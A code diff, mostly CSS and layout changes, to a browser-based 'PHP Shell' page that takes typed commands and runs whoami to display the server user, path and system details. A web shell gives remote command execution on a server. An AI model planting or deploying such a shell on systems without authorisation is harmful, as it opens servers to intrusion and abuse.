@@ -14,21 +14,29 @@
 <title>PHP Shell</title>
 <style>
 
-body{background-color: black; }
+* {
+  margin: 0;
+  padding: 0;
+  border: 0;
+  overflow-y: hidden;
+  background-color:black;
+}
+html,body{
+height: 100%;
+}
+.wrapper{
+   min-height:100%;
+   margin 0 auto -2em;
+}
 .output{
-border: 0px;
-color: white;
-  background-color: black;
+  color: white;
   font-family:"Courier New",monospace;
   font-size:12px;
   width: 100%;
   height: 90%;
-  padding:0px;
-  margin:0px;
 }
 .input{
   float: left;
-  border:0px;
   border-bottom:2px inset white;
   border-top:2px inset white;
   color: white;
@@ -37,29 +45,24 @@ color: white;
   font-size:12px;
   width: 90%;
   height: 4%;
-  padding:0px;
-  margin:0px;
 }
 .info{
-  border: 0;
+  clear: both;
+  display: block;
   color:white;
-  background-color: black;
   font-family:"Courier New",monospace;
   font-size:12px;
   width: 100%;
-  height: 3%;
-  padding:0px;
-  margin:0px;
-  vertical-align:bottom;
+  height: 2em;
+  margin-top: -2em;
+}
+.push{
+    height: 2em;
 }
 .form1{
-  padding:0px;
-  margin:0px;
-  border:0px;
+  height:100%;
 }
 .button{
-  padding:0px;
-  margin:0px;
   border:0px;
   border-left:1px outset white;
   border-top:1px outset white;
@@ -72,10 +75,6 @@ color: white;
   height: 4%;
   width:10%;
   float:right;
-}
-html,body{
-  padding:0px;
-  margin:0px;
 }
 p{ color:white; }
 </style>
@@ -201,13 +200,16 @@ function useHttpResponse() {
 </script>
 
 </head>
+<div class="wrapper">
 <body onLoad="document.form1.input.focus(); document.form1.output.scrollTop = document.form1.output.scrollHeight" onKeyDown="return submitform(this, event)">
 <form name="form1">
-<textarea name="output" class="output" readonly=true>
-
-</textarea>
+<textarea name="output" class="output" readonly=true></textarea>
+<script>document.form1.output.value="";document.title="PHP Shell: " + window.location.hostname;</script>
 <textarea name="input" class="input"></textarea>
 <button name="submit_button" class="button" type="button" readonly=true onclick="updateData(document.form1.input.value); document.form1.input.value=''">Execute!</button>
+</form>
+<div class="push"></div>
+</div>
 <textarea name="info" class="info" readonly=true>
 <? 
 exec("whoami",$who);
@@ -216,8 +218,6 @@ $sys=PHP_OS . ", " .$_SERVER['SERVER_SOFTWARE']. ", " . phpversion();
 echo "user: $who[0]\tlocation: $pwd\tsystem: $sys"; 
 ?>
 </textarea>
-</form>
-<script>document.form1.output.value="";</script>
 </body>
 </html>
 <?
